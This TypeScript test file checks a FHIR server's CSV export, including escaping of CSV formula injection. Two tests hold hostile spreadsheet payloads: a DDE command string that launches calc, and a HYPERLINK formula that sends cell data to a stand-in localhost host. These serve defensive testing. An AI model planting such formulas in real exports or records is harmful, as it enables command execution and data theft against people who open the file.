import { ContentType } from '@medplum/core';
import { ServiceRequest } from '@medplum/fhirtypes';
import { randomUUID } from 'crypto';
import express from 'express';
import request from 'supertest';
import { initApp, shutdownApp } from '../../app';
import { loadTestConfig } from '../../config';
import { initTestAuth } from '../../test.setup';

const app = express();
let accessToken: string;

describe('CSV Export', () => {
  beforeAll(async () => {
    const config = await loadTestConfig();
    await initApp(app, config);
    accessToken = await initTestAuth({ project: { strictMode: false } });
  });

  afterAll(async () => {
    await shutdownApp();
  });

  test('Export Patient', async () => {
    // Create a patient that we want to export
    const res1 = await request(app)
      .post(`/fhir/R4/Patient`)
      .set('Authorization', 'Bearer ' + accessToken)
      .set('Content-Type', ContentType.FHIR_JSON)
      .send({
        resourceType: 'Patient',
        name: [
          {
            given: ['Alice'],
            family: 'Smith',
          },
        ],
        address: [
          {
            use: 'home',
            line: ['123 Main St'],
            city: 'Anywhere',
            state: 'CA',
            postalCode: '90210',
          },
        ],
        telecom: [
          {
            system: 'phone',
            value: '555-555-5555',
          },
          {
            system: 'email',
            value: 'alice@example.com',
          },
        ],
      });
    expect(res1.status).toBe(201);

    // Also create an empty patient to make sure we handle missing values
    const res2 = await request(app)
      .post(`/fhir/R4/Patient`)
      .set('Authorization', 'Bearer ' + accessToken)
      .set('Content-Type', ContentType.FHIR_JSON)
      .send({
        resourceType: 'Patient',
      });
    expect(res2.status).toBe(201);

    const res3 = await request(app)
      .get(`/fhir/R4/Patient/$csv?_fields=id,name,address,email,phone`)
      .set('Authorization', 'Bearer ' + accessToken);
    expect(res3.status).toBe(200);
    expect(res3.text).toContain(res1.body.id);
    expect(res3.text).toContain(res2.body.id);
    expect(res3.text).toContain('123 Main St');
    expect(res3.text).toContain('555-555-5555');
    expect(res3.text).toContain('alice@example.com');
  });

  test('Export ServiceRequest', async () => {
    const serviceRequest: ServiceRequest = {
      resourceType: 'ServiceRequest',
      status: 'active',
      intent: 'order',
      subject: {
        reference: 'Patient/' + randomUUID(),
        display: 'Alice Smith',
      },
      code: {
        coding: [
          {
            system: 'https://example.com',
            code: 'test1',
            display: 'test1',
          },
        ],
      },
      orderDetail: [
        {
          text: 'Shipped',
        },
      ],
    };

    // Create a service requeset that we want to export
    const res1 = await request(app)
      .post(`/fhir/R4/ServiceRequest`)
      .set('Authorization', 'Bearer ' + accessToken)
      .set('Content-Type', ContentType.FHIR_JSON)
      .send(serviceRequest);
    expect(res1.status).toBe(201);

    const res3 = await request(app)
      .get(`/fhir/R4/ServiceRequest/$csv?_fields=id,subject,code,orderDetail`)
      .set('Authorization', 'Bearer ' + accessToken);
    expect(res3.status).toBe(200);
    expect(res3.text).toContain(res1.body.id);
    expect(res3.text).toContain('Alice Smith');
    expect(res3.text).toContain('test1');
    expect(res3.text).toContain('Shipped');
  });

  test('Handle malformed data', async () => {
    const serviceRequest: ServiceRequest = {
      resourceType: 'ServiceRequest',
      status: 'active',
      intent: 'order',
      subject: {
        reference: 'Patient/' + randomUUID(),
        display: 'Alice Smith',
      },
      code: {
        coding: [
          {
            system: 'https://example.com',
            code: ['test1'] as unknown as string, // Force malformed data
          },
        ],
      },
      orderDetail: [
        {
          text: 'Shipped',
        },
      ],
    };

    // Create a service requeset that we want to export
    const res1 = await request(app)
      .post(`/fhir/R4/ServiceRequest`)
      .set('Authorization', 'Bearer ' + accessToken)
      .set('Content-Type', ContentType.FHIR_JSON)
      .send(serviceRequest);
    expect(res1.status).toBe(201);

    const res3 = await request(app)
      .get(
        `/fhir/R4/ServiceRequest/$csv?_fields=id,subject,code,orderDetail&subject=${serviceRequest.subject?.reference}`
      )
      .set('Authorization', 'Bearer ' + accessToken);
    expect(res3.status).toBe(200);
    expect(res3.text).toContain(res1.body.id);
    expect(res3.text).toContain('Alice Smith');
    expect(res3.text).toContain('Shipped');
    expect(res3.text).not.toContain('test1');
  });

  test('Invalid resource type', async () => {
    const res = await request(app)
      .get(`/fhir/R4/Patientx/$csv`)
      .set('Authorization', 'Bearer ' + accessToken);
    expect(res.status).toBe(400);
  });

  test('Invalid query string param', async () => {
    const res = await request(app)
      .get(
        `/fhir/R4/ClientApplication/$csv?_count=20&_fields=id,_lastUpdated,=cmd|'/C%20calc'!A0&_offset=0&_sort=-_lastUpdated`
      )
      .set('Authorization', 'Bearer ' + accessToken);
    expect(res.status).toBe(400);
    expect(res.body.issue[0].details.text).toEqual('Invalid FHIRPath expression');
  });

  test('Escape formula string', async () => {
    // Create a patient that we want to export
    const res1 = await request(app)
      .post(`/fhir/R4/Patient`)
      .set('Authorization', 'Bearer ' + accessToken)
      .set('Content-Type', ContentType.FHIR_JSON)
      .send({
        resourceType: 'Patient',
        gender: '=HYPERLINK("http://localhost:8181/?data="&F3,"Click Me")',
      });
    expect(res1.status).toBe(201);

    const res3 = await request(app)
      .get(`/fhir/R4/Patient/$csv?_fields=id,gender`)
      .set('Authorization', 'Bearer ' + accessToken);
    expect(res3.status).toBe(200);
    expect(res3.text).toContain(res1.body.id);

    // Note the escaped quotes and single quote prefix
    expect(res3.text).toContain(`"'=HYPERLINK(""http://localhost:8181/?data=""&F3,""Click Me"")"`);
  });
});
